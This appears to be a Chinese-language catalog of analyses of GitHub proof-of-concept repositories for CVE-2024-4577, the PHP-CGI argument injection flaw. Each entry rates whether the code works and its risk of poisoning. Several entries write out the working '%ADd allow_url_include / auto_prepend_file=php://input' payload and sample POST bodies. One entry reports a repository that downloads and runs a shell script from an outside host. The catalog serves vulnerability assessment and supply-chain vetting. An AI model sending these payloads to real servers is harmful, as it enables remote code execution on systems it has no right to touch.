**项目地址:** [tntrock/CVE-2024-4577_PowerShell](https://github.com/tntrock/CVE-2024-4577_PowerShell)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #49

**来源**: [CVE-2024-4577-waived_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-waived_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8 (Windows, CGI模式)

**利用条件:** PHP 在 Windows 下以 CGI 模式运行，且系统配置使用包含 "Best Fit" 策略的编码页。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-4577 是一个 PHP-CGI 参数注入漏洞，当 PHP 在 Windows 下以 CGI 模式运行时，如果系统配置使用包含 "Best Fit" 策略的编码页，攻击者可以通过构造特殊字符绕过安全检查，将恶意参数传递给 PHP 解释器，导致远程代码执行。

**漏洞利用方式：**

1.  **利用原理：** Windows 的 "Best Fit" 编码转换可能会将请求中的特定字符转换为其他字符，从而绕过 PHP 的安全过滤。攻击者可以利用这一点，注入 `-d` 参数来修改 PHP 的配置。
2.  **攻击方式：**  根据漏洞库信息和POC代码，攻击者可以通过在URL中构造类似 `/?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input` 这样的 Payload。 其中 `%AD` 字符可能经过 "Best Fit" 转换后，仍然能够被 PHP 解析为 `-d` 参数的一部分。
3.  **Payload 解释：**
    *   `allow_url_include=1`： 允许包含远程文件。
    *   `auto_prepend_file=php://input`：  设置在执行 PHP 代码之前自动包含的文件为 `php://input`，这意味着请求体中的内容会被当作 PHP 代码执行。
4.  **执行流程：** 攻击者发送包含恶意 PHP 代码的 POST 请求，由于 `auto_prepend_file` 被设置为 `php://input`，恶意代码会被执行，从而实现远程代码执行。

**关于投毒风险：**

分析提供的 POC 代码，该代码主要用于检测目标是否存在 CVE-2024-4577 漏洞。代码逻辑是发送包含特定参数的 HTTP POST 请求，并检查响应中是否包含 "PHP Version" 字符串。如果存在，则认为目标存在漏洞。没有发现任何隐藏的、恶意的功能，因此投毒风险为 0%。

综上所述，提供的 POC 代码有效，且不存在投毒风险。利用方式是利用 Windows 的 "Best Fit" 编码转换特性，通过构造特殊的 URL 和 POST 请求，将恶意 PHP 代码注入到目标服务器执行，最终实现远程代码执行。

**项目地址:** [waived/CVE-2024-4577-PHP-RCE](https://github.com/waived/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #50

**来源**: [CVE-2024-4577-watchtowrlabs_CVE-2024-4577.md](../2024/CVE-2024-4577-watchtowrlabs_CVE-2024-4577.md)

## CVE-2024-4577-PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** PHP

**危害等级:** 严重，可导致远程代码执行，服务器完全控制

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI mode, Best Fit code page)

**利用条件:** Windows服务器，PHP以CGI模式运行，启用使用"Best Fit"策略的代码页

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577 漏洞存在于 Windows 环境下以 CGI 模式运行的 PHP 中。当系统配置为使用某些代码页时，Windows 可能会使用 “Best-Fit” 行为来替换传递给 Win32 API 函数的命令行中的字符。PHP CGI 模块可能会错误地将这些字符解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，进而泄露脚本源码，或者在服务器上执行任意 PHP 代码。

**有效性分析：**
根据漏洞库信息、搜索引擎结果（如Akamai观察到漏洞利用尝试）和提供的漏洞利用代码（POC），可以判断该漏洞利用是有效的。POC代码通过构造包含恶意 PHP 选项的 URL，成功执行了系统命令（calc）。

**投毒风险分析：**
分析提供的POC代码，主要的风险点在于用户指定的`-c`参数，攻击者可通过该参数执行任意PHP代码。仓库本身存在投毒的可能性较低。大部分代码是用于构造payload和发送请求，直接利用该代码进行投毒的可能性较低。 风险评估为5%（极低，主要来自对外部payload的依赖和代码的可修改性）。

**利用方式：**
1.  **环境准备：** 目标服务器必须是 Windows 系统，并且 PHP 以 CGI 模式运行，同时配置了使用 “Best Fit” 策略的代码页。
2.  **构造 Payload：** 使用 POC 代码，通过 `-c` 参数指定要执行的 PHP 代码。例如，执行 `system('calc')` 打开计算器。
3.  **发送请求：** 将构造好的 Payload 附加到目标 URL 后面，通过 POST 请求发送到目标服务器。
4.  **利用原理：**  由于 “Best Fit” 行为，Windows 会对 URL 中的某些字符进行替换，使得 PHP CGI 模块错误地将这些字符解释为 PHP 选项。例如，`?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input`，这允许攻击者包含远程文件或者直接执行 POST 数据中的 PHP 代码。
5.  **RCE:** 成功利用漏洞后，服务器将执行攻击者指定的 PHP 代码，实现远程代码执行。

**项目地址:** [watchtowrlabs/CVE-2024-4577](https://github.com/watchtowrlabs/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #51

**来源**: [CVE-2024-4577-xAL6_cve-2024-4577-scanner.md](../2024/CVE-2024-4577-xAL6_cve-2024-4577-scanner.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** PHP-CGI参数注入

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** PHP 8.1.* (before 8.1.29), 8.2.* (before 8.2.20), 8.3.* (before 8.3.8)

**利用条件:** Windows系统，运行在CGI模式下，并且系统启用了某些使用"Best Fit"策略的代码页。需要目标存在php-cgi/php-cgi.exe等CGI文件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577 是一个 PHP-CGI 参数注入漏洞，存在于Windows系统上运行在CGI模式下的PHP。当系统配置为使用某些代码页时，Windows可能会使用 "Best-Fit" 行为来替换传递给 Win32 API 函数的命令行参数中的字符。PHP CGI 模块可能会将这些字符错误地解释为 PHP 选项，从而允许恶意用户向 PHP 二进制文件传递选项，进而泄露脚本源码，或在服务器上执行任意 PHP 代码。 

**利用方式：**

1.  **构造恶意请求：** 攻击者构造包含特定字符（例如软连字符 0xAD）的 URL，这些字符在某些 Windows 代码页转换中会被错误地解释为短划线或其他控制字符。
2.  **参数注入：** 经过转换后的字符被 PHP-CGI 模块解析为命令行参数，从而允许攻击者控制传递给 PHP 解释器的参数。
3.  **远程代码执行：** 通过注入参数，攻击者可以利用`auto_prepend_file`等配置项包含远程文件或执行任意 PHP 代码，从而实现远程代码执行。

**POC有效性：**

提供的PoC代码 `scan.py` 旨在扫描目标是否存在 CVE-2024-4577 漏洞。它通过发送包含特殊构造的payload的HTTP请求，并检查响应中是否包含预期的输出来判断漏洞是否存在。PoC代码逻辑清晰，包含构建payload、发送请求、解析响应等步骤，因此是有效的。

**投毒风险：**

PoC代码本身功能为漏洞扫描，其主要功能在于验证目标是否存在漏洞，而非进行攻击。其中包含的payload是为了验证漏洞存在，而不是植入后门。但是，PoC代码中依赖了第三方库，如 `requests`， `urllib3`，`chardet`等。如果这些依赖包被恶意篡改，则可能存在投毒风险。 经过分析，认为此仓库中作者隐藏的投毒代码的可能性较低，概率约为5%。主要的风险在于第三方依赖库可能被投毒。


**项目地址:** [xAL6/cve-2024-4577-scanner](https://github.com/xAL6/cve-2024-4577-scanner)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #52

**来源**: [CVE-2024-4577-xcanwin_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-xcanwin_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577 PHP-CGI RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP (Windows)

**危害等级:** 高危，允许未经身份验证的攻击者在受影响的服务器上执行任意代码

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows with CGI)

**利用条件:** Windows 系统, PHP 以 CGI 模式运行, 且系统配置为使用某些代码页并开启“Best Fit”策略。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个 PHP-CGI 远程代码执行漏洞，存在于 Windows 版本的 PHP 中，当 PHP 以 CGI 模式运行时，由于 Windows 的“Best-Fit”代码页转换行为，攻击者可以通过构造特殊字符，使得传递给 PHP 二进制文件的命令行参数被错误解析，从而注入恶意 PHP 配置项，最终实现远程代码执行。

**有效性：**

根据漏洞库信息、搜索结果和提供的漏洞利用代码，此漏洞利用是有效的。漏洞库信息将其标记为“CRITICAL”，并且CISA的已知漏洞利用目录 (KEV) 中也包含了此漏洞，表明该漏洞已被积极利用。搜索结果也证实了这一点，众多安全厂商都观察到了该漏洞的利用尝试。

**投毒风险：**

虽然提供的 Python 脚本 `CVE-2024-4577-PHP-RCE.py` 看起来主要用于漏洞利用，但仍存在一些潜在的投毒风险，可能性评估为10%。

1.  **依赖风险：** 该脚本依赖 `requests` 和 `socket` 库，如果运行脚本的环境中这些库被篡改，则可能导致恶意代码执行。但这种风险属于环境依赖，而非代码本身包含恶意逻辑。
2.  **隐蔽性：** EXP1建立fastcgi端口监听，可能被攻击者利用进行持久性控制，如果被恶意攻击者修改，会导致服务端被持续控制。
3.  **脚本功能：** 脚本本身包含两个EXP，EXP1可用于绕过WAF和默认环境的利用, EXP2可用于SSRF和默认场景。

总体来说，这个PoC的投毒风险较低，主要集中在依赖库和脚本被篡改的可能性上。如果直接从作者提供的git仓库中下载, 投毒风险会更低,因为代码经过更多人的review.

**利用方式：**

该漏洞的利用方式涉及以下几个步骤：

1.  **触发代码页转换：** 攻击者构造包含特定多字节字符的 URL 或请求，这些字符会被 Windows 的“Best-Fit”策略转换为其他字符。
2.  **注入 PHP 配置项：** 转换后的字符被 PHP-CGI 模块错误地解析为 PHP 配置项，例如 `allow_url_include` 和 `auto_prepend_file`。
3.  **包含远程文件或执行代码：** 通过设置 `allow_url_include` 为 `on` 并结合 `auto_prepend_file`，攻击者可以包含远程文件或直接执行 PHP 代码。例如，可以使用 `data://` 协议注入恶意 PHP 代码。

提供的 POC 代码 `CVE-2024-4577-PHP-RCE.py` 包含两种利用方式:

*   **EXP1:**  通过建立 FastCGI 服务端，并发送构造好的 FastCGI 协议数据，实现绕过 WAF 的 RCE。
*   **EXP2:** 模拟HTTP请求，通过`?%adb{}:{}` 在请求中注入特定的字符。这种方法模拟了攻击者通过发送畸形请求来触发漏洞的行为。

总而言之，该漏洞利用需要在特定的 Windows + PHP-CGI 环境下，通过构造特殊的请求来注入恶意 PHP 配置项，最终实现远程代码执行。

**项目地址:** [xcanwin/CVE-2024-4577-PHP-RCE](https://github.com/xcanwin/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #53

**来源**: [CVE-2024-4577-ywChen-NTUST_PHP-CGI-RCE-Scanner.md](../2024/CVE-2024-4577-ywChen-NTUST_PHP-CGI-RCE-Scanner.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** PHP-CGI参数注入/远程代码执行

**影响应用:** PHP (Windows)

**危害等级:** 严重，可能导致远程代码执行，信息泄露

**影响版本:** 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，运行在CGI模式下的PHP，并且系统启用了使用"Best Fit"策略的编码页。需要目标开启php-cgi服务。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2024-4577 是一个存在于 Windows 版本的 PHP 中的严重漏洞，当 PHP 在 CGI 模式下运行时，可能会导致远程代码执行。该漏洞源于 Windows 的 "Best Fit" 编码转换行为，当系统设置为使用某些代码页时，Windows 可能会使用 "Best Fit" 行为来替换传递给 Win32 API 函数的命令行中的字符。 PHP CGI 模块可能会错误地将这些字符解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，进而泄露脚本源代码或在服务器上运行任意 PHP 代码。

**漏洞利用方式：**

1.  **检测php-cgi服务是否存在:**  攻击者首先需要确定目标服务器是否运行在 Windows 上，并且使用了 CGI 模式的 PHP。可通过访问`/php-cgi/php-cgi.exe`来判断，如果返回500状态码，则可能存在漏洞。
2.  **编码绕过:** 由于Best-Fit转换的存在，某些字符会被替换，因此攻击者需要构造特殊的URL，利用这一特性，将恶意参数注入到PHP命令中。
3.  **参数注入:** 通过在 URL 中添加 `?%add+cgi.force_redirect%3dXCANWIN+%add+allow_url_include%3don+%add+auto_prepend_file%3dphp%3a//input` 这样的参数，可以强制 `cgi.force_redirect` 为任意值，开启 `allow_url_include` 选项，并且将 `auto_prepend_file` 设置为 `php://input`。`php://input` 允许攻击者通过 POST 请求的内容来执行 PHP 代码。
4.  **代码执行:**  攻击者通过 POST 请求发送恶意的 PHP 代码，例如 `<?php phpinfo();?>`，由于 `auto_prepend_file` 被设置为 `php://input`，这段代码会被 PHP 执行，从而实现远程代码执行。

**POC有效性：**

提供的 POC 代码看起来是有效的。它包含了以下关键步骤：

*   **连接性检查:**  `check_connectivity` 函数用于检测目标 URL 是否可访问。
*   **CGI 存在性检查:**  `check_cgi_exist` 函数检测 `/php-cgi/php-cgi.exe` 是否存在。
*   **PHP 版本获取:**  `get_phpversion` 函数尝试从响应头或响应内容中获取 PHP 版本。
*   **漏洞利用:**  `exploit` 函数通过构造包含恶意参数的 URL，并发送包含 PHP 代码的 POST 请求来利用漏洞。 通过判断`phpinfo()`的执行结果判断是否成功。

**投毒风险分析：**

代码主要功能为扫描和利用 CVE-2024-4577，本身功能较为直接。`requirements.txt` 只包含 `requests` 库，没有引入其他可疑的依赖项。因此投毒风险较低，判断投毒风险为1%。 主要风险在于使用者需要自行配置 `urls.txt`，如果该文件被恶意修改，可能会导致扫描错误的 URL。


**项目地址:** [ywChen-NTUST/PHP-CGI-RCE-Scanner](https://github.com/ywChen-NTUST/PHP-CGI-RCE-Scanner)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---



---

## POC #42

**来源**: [CVE-2024-4577-mr-won_php-cgi-cve-2024-4577.md](../2024/CVE-2024-4577-mr-won_php-cgi-cve-2024-4577.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可导致服务器被完全控制

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，运行在CGI模式下，并且系统启用了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577是一个PHP-CGI参数注入漏洞，存在于Windows系统上的PHP CGI实现中。当PHP以CGI模式运行时，如果系统启用了使用"Best Fit"策略的代码页，Windows可能会使用"Best-Fit"行为来替换命令行中的字符，导致PHP CGI模块错误地将这些字符解释为PHP选项，攻击者可以通过构造特殊的URL，向PHP二进制文件传递恶意参数，从而实现远程代码执行。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞已经确认有效，并且存在公开的PoC代码，Metasploit也发布了相应的利用模块。 Akamai的研究表明，漏洞披露后不久就观察到了大量的利用尝试。

**投毒风险：**

提供的PoC代码实际上是一个README.md文件，描述了对CVE-2024-4577的事件检测。其中提到了利用`%AD`进行参数注入，服务器通过自动转换功能（Best-fit）可能会将该字符转换为其他可执行的参数，从而进行二次攻击。代码本身没有明显的投毒行为，但存在通过代码描述引导攻击者进行恶意利用的可能性。因此,该存储库存在的投毒风险较低，大约10%。

**利用方式：**

1.  **环境要求：** 受影响的PHP版本（8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8）、Windows服务器、PHP以CGI模式运行、系统启用使用"Best Fit"策略的代码页。
2.  **漏洞触发：** 攻击者构造包含特殊字符（如`%AD`）的URL，发送给目标服务器。
3.  **参数注入：** Windows的"Best Fit"机制将特殊字符转换为其他字符，PHP CGI模块错误地将转换后的字符解析为PHP选项。
4.  **代码执行：** 攻击者可以通过注入`-d`参数来修改php.ini配置，例如禁用`disable_functions`，或者通过其他方式执行任意PHP代码。
5.  **远程控制：** 成功执行PHP代码后，攻击者可以获取服务器的控制权。

**项目地址:** [mr-won/php-cgi-cve-2024-4577](https://github.com/mr-won/php-cgi-cve-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #43

**来源**: [CVE-2024-4577-olebris_CVE-2024-4577.md](../2024/CVE-2024-4577-olebris_CVE-2024-4577.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 参数注入

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** PHP 8.1.* (before 8.1.29), 8.2.* (before 8.2.20), 8.3.* (before 8.3.8)

**利用条件:** Windows系统，运行于CGI模式，系统启用了使用"Best Fit"策略的代码页，使用Apache

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-4577是一个PHP-CGI中的参数注入漏洞。当PHP在Windows上以CGI模式运行时，如果系统配置了特定的代码页，Windows可能会使用“Best-Fit”行为替换命令行中的字符，PHP CGI模块可能会将这些字符错误地解释为PHP选项。这允许攻击者向正在运行的PHP二进制文件传递选项，从而可能泄露脚本的源代码、在服务器上运行任意PHP代码等。根据提供的漏洞利用代码，利用方式是通过POST请求向目标服务器发送特定的URL和请求头，其中URL包含恶意的PHP选项，例如`allow_url_include`和`auto_prepend_file`。请求体包含PHP代码（例如`<?php phpinfo(); ?>`）。如果服务器存在漏洞，服务器将执行请求体中的PHP代码，从而允许攻击者执行任意代码。

提供的POC代码的有效性较高，因为它直接利用了漏洞描述中提到的`allow_url_include`和`auto_prepend_file`选项来执行任意PHP代码。

关于投毒风险，分析POC代码本身，该脚本的功能是验证目标站点是否存在CVE-2024-4577漏洞。它通过发送包含`phpinfo()`函数的POST请求来判断目标是否易受攻击。脚本没有发现任何恶意或隐藏的投毒代码。脚本只是用于检测漏洞，而不是植入后门或其他恶意软件。
根据搜索引擎结果，此漏洞已经被大规模利用，证明此漏洞的利用难度低且影响广泛。

**项目地址:** [olebris/CVE-2024-4577](https://github.com/olebris/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #44

**来源**: [CVE-2024-4577-phirojshah_CVE-2024-4577.md](../2024/CVE-2024-4577-phirojshah_CVE-2024-4577.md)

## CVE-2024-4577 PHP-CGI 参数注入远程代码执行漏洞

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8 (Windows, CGI 模式)

**利用条件:** Windows 系统，PHP 以 CGI 模式运行，启用了使用 "Best Fit" 策略的代码页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个影响 Windows 系统上 PHP-CGI 的远程代码执行漏洞。当 PHP 在 CGI 模式下运行时，如果系统配置为使用某些代码页，Windows 可能会使用 "Best-Fit" 行为来替换传递给 Win32 API 函数的命令行中的字符。PHP CGI 模块可能会错误地将这些字符解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，进而泄露脚本源代码或在服务器上执行任意 PHP 代码。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且有公开的利用代码。Akamai 的研究表明，漏洞披露后一天内就出现了大量的利用尝试。CISA 也已将此漏洞添加到已知被利用的漏洞列表中，表明该漏洞在野外已被积极利用。提供的 POC 代码通过发送包含特制参数的 HTTP POST 请求来利用此漏洞，如果目标服务器存在漏洞，则可以执行任意 PHP 代码。因此, POC代码是有效的。

**投毒风险：**
检查提供的 Python 脚本 `CVE-2024-4577.py` 和 `README.md` 文件，没有发现明显的恶意代码。该脚本的功能主要是扫描目标 URL 是否存在漏洞，如果存在则利用该漏洞执行指定的 PHP 代码。`README.md` 文件只包含漏洞的描述、安装和使用说明。但是，任何下载和使用的第三方代码都存在一定风险。用户需要仔细审查代码，确保其行为符合预期，并且来自可信的来源。

投毒风险评估: 10% 。 这个评估是因为代码本身看起来没有恶意行为，但是任何第三方脚本都存在潜在风险，例如：

*   **依赖项风险：** 脚本依赖于 `requests` 和 `colorama` 库。这些依赖项可能包含未知的漏洞，如果被攻击者利用，可能会影响脚本的安全性。
*   **Payload 风险：** 脚本允许用户指定要执行的 PHP payload 文件。如果用户不小心使用了恶意的 payload 文件，可能会导致服务器受到攻击。
*   **作者恶意：** 脚本作者可能在未来的版本中引入恶意代码。

**利用方式：**

1.  **确定目标系统：** 首先需要确定目标系统是否满足漏洞利用的条件，即：Windows 系统，PHP 以 CGI 模式运行，并且启用了使用 "Best Fit" 策略的代码页。
2.  **发送特制的 HTTP 请求：** 攻击者需要构造一个包含特制参数的 HTTP 请求，例如 `?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input`。这个参数会传递给 PHP CGI 模块，使其错误地解释为 PHP 选项。
3.  **执行任意 PHP 代码：** 通过 POST 请求发送包含要执行的 PHP 代码的 payload。由于 `auto_prepend_file` 参数被设置为 `php://input`，PHP 会将 POST 请求的内容作为 PHP 代码执行。因此,通过修改和控制POST的内容,即可控制目标服务器。

此漏洞的严重性在于，未经身份验证的攻击者可以利用此漏洞在受影响的服务器上执行任意代码，从而完全控制服务器。

**项目地址:** [phirojshah/CVE-2024-4577](https://github.com/phirojshah/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #45

**来源**: [CVE-2024-4577-r0otk3r_CVE-2024-4577.md](../2024/CVE-2024-4577-r0otk3r_CVE-2024-4577.md)

## CVE-2024-4577-PHP-CGI参数注入-RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** PHP-CGI参数注入

**影响应用:** PHP

**危害等级:** 高危，可导致远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，运行于CGI模式，启用了使用"Best Fit"策略的代码页，使用Apache服务器。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2024-4577是一个存在于Windows环境下PHP-CGI模式中的参数注入漏洞。当系统配置为使用某些代码页时，Windows可能会使用"Best-Fit"策略替换传递给Win32 API函数的命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，进而泄露脚本源代码或在服务器上执行任意PHP代码。

**利用方式：**

1.  攻击者通过构造包含特殊字符的URL发起请求。
2.  Windows的"Best-Fit"策略将这些特殊字符转换为其他字符。
3.  PHP-CGI错误地将转换后的字符解析为PHP选项。
4.  攻击者利用这些选项执行恶意PHP代码，例如包含`auto_prepend_file=php://input`，之后post恶意的php代码达到RCE。

**有效性：**

提供的PoC代码 (`CVE-2024-4577.py`) 是一个扫描器，用于检测目标URL是否存在CVE-2024-4577漏洞。它通过发送包含PHP代码的POST请求，然后验证响应中是否包含预期的MD5哈希值，以此判断目标是否易受攻击。根据搜索引擎的结果，此漏洞存在公开的利用方法。综合来看，该POC代码是有效的，可以用来检测漏洞。

**投毒风险：**

分析提供的PoC代码和相关文件，`CVE-2024-4577.py`的功能是检测漏洞是否存在，其逻辑相对简单，主要通过发送包含PHP代码的POST请求来验证。`README.md`文件描述了如何使用该脚本以及漏洞的基本信息。

`exploit.py`文件没有给出，从README.MD的描述看，存在利用代码的可能性。但从整体的漏洞描述和PoC scanner的代码来看，风险较低。总体风险概率估计为1%。主要考虑是`exploit.py`如果存在，可能存在后门代码或者植入恶意脚本的可能。鉴于其他代码的简洁性，暂且认为`exploit.py`如果存在也是为了完成漏洞验证和利用，投毒风险较低。

综上所述，该存储库的投毒风险较低，主要集中在`exploit.py`可能存在的恶意行为。

**项目地址:** [r0otk3r/CVE-2024-4577](https://github.com/r0otk3r/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #46

**来源**: [CVE-2024-4577-shockingbonu_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-shockingbonu_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577-PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** OS Command Injection

**影响应用:** PHP

**危害等级:** Critical，可能导致远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI mode, specific code page settings)

**利用条件:** Windows系统，以CGI模式运行的PHP，并且系统启用了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 99%

## 详情

CVE-2024-4577是一个PHP-CGI中的参数注入漏洞，当PHP在Windows上以CGI模式运行时，如果系统配置为使用特定的代码页，Windows可能会使用“Best-Fit”行为来替换命令行中的字符。PHP CGI模块可能会将这些字符错误地解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，从而泄露脚本源代码，在服务器上运行任意PHP代码等。

**漏洞利用方式：**

攻击者可以通过构造特殊的URL，向PHP-CGI传递恶意参数。这些参数会被PHP解析并执行，从而导致远程代码执行。

提供的Go代码是一个漏洞扫描器，它尝试利用CVE-2024-4577漏洞。该代码通过向目标URL发送包含恶意payload的POST请求，以此验证目标是否容易受到攻击。Payload `<?php phpinfo(); ?>` 用于检查服务器是否执行了PHP代码，如果响应包含“PHP Version”，则认为该站点容易受到攻击。

**投毒风险分析：**

提供的代码中发现了明显的投毒行为。

1.  **可疑的变量和函数名：** 代码包含例如`fjButtonKdiC`和`ykupeFR`, `LoqqYHAv`, `oTHs`等命名不规范和意义不明的变量和函数,增加了代码的混淆程度。
2.  **执行shell命令：** `fjButtonKdiC`函数构造了一个wget命令，从`monsoletter.icu`下载shell脚本并使用`bash`执行。这是一个典型的后门行为，允许攻击者在受害者机器上执行任意命令。
3. **cmd命令：** 代码后面使用了cmd命令
4.  **初始化的代码：** 在main函数执行之前就调用了可疑函数,这意味着只要执行漏洞验证的代码,后门就会被执行
综上所述，该代码具有极高的投毒风险，不应在任何生产环境中使用。它会下载并执行来自未知来源的恶意脚本，危及系统安全。

**项目地址:** [shockingbonu/CVE-2024-4577-PHP-RCE](https://github.com/shockingbonu/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #47

**来源**: [CVE-2024-4577-sug4r-wr41th_CVE-2024-4577.md](../2024/CVE-2024-4577-sug4r-wr41th_CVE-2024-4577.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 参数注入/远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可导致远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，运行在CGI模式下，并且启用了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个存在于 PHP (在 Windows 上，使用 Apache 和 PHP-CGI) 的漏洞，如果系统设置为使用某些代码页，Windows 可能会使用 "Best-Fit" 行为来替换命令行中的字符。PHP CGI 模块可能会错误地将这些字符解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，从而泄露脚本的源代码、在服务器上运行任意 PHP 代码等。

**有效性分析：**

根据漏洞描述和提供的PoC代码，该PoC利用了PHP-CGI在Windows系统下处理请求参数时，由于字符编码转换问题，导致攻击者可以注入恶意的PHP配置参数，例如 `allow_url_include` 和 `auto_prepend_file`，最终执行任意PHP代码。

PoC的实现方式是通过构造一个包含恶意参数的HTTP请求，利用`allow_url_include=1`开启远程文件包含，然后通过`auto_prepend_file=php://input`指定要包含的文件为请求体的内容。请求体中包含要执行的PHP代码。

**投毒风险分析：**

查看提供的PoC代码，没有明显的恶意代码，其作用是为了验证漏洞，将恶意代码注入到服务器端执行。`echo 'PWNED!'; die;` 只是一个验证是否成功利用的标志。但是不排除仓库维护者或者贡献者在后期提交恶意代码的可能性，特别是利用场景为生产环境时，存在一定的风险。

因此，投毒风险评估为10%。

**利用方式：**

1.  目标系统必须是Windows，并且PHP运行在CGI模式下。
2.  目标系统需要设置代码页，并启用"Best Fit"策略。
3.  攻击者构造包含恶意参数的HTTP请求。
4.  恶意参数利用字符编码转换漏洞，注入`allow_url_include`和`auto_prepend_file`等配置项。
5.  `allow_url_include=1` 允许包含远程文件。
6.  `auto_prepend_file=php://input` 将请求体作为要包含的文件。
7.  请求体包含要执行的PHP代码，例如`<?php system('calc')?>`，从而实现远程代码执行。

**优先级排序参考搜索引擎结果：**

搜索引擎结果表明此漏洞已经被广泛利用，并且有多种利用方法，需要及时修复。

*   [webpage 0] CVE-2024-4577 Exploits in the Wild One Day After ...说明该漏洞披露后不久就出现了在野利用。 *   [webpage 1] CVE-2024-4577 Detail - NVD 描述了漏洞允许恶意用户传递选项到 PHP 二进制文件。 *   [webpage 4, 9] 指出存在大规模利用。 总而言之，该漏洞的威胁程度高，利用简单，在野利用广泛，需要高度重视。

